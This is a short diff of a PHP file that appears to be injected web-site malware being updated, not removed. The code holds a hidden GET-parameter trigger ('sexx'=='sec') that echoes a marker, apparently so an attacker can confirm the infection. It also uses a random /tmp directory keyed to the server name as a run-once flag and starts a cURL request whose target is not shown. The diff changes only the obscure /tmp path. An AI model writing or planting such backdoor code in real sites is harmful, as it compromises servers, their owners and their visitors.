@@ -2,8 +2,8 @@
 if(isset($_GET["sexx"])&&$_GET["sexx"]=="sec"){ echo('Apache Hec'); }
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
-if(filesize('/tmp/dfgdgfdg4g4g'.$d.$random)) { } else {
-	mkdir('/tmp/dfgdgfdg4g4g'.$d.$random);
+if(filesize('/tmp/65465484'.$d.$random)) { } else {
+	mkdir('/tmp/65465484'.$d.$random);
   $curl3 = curl_init();
  curl_setopt_array($curl3, [
     CURLOPT_RETURNTRANSFER => 1,
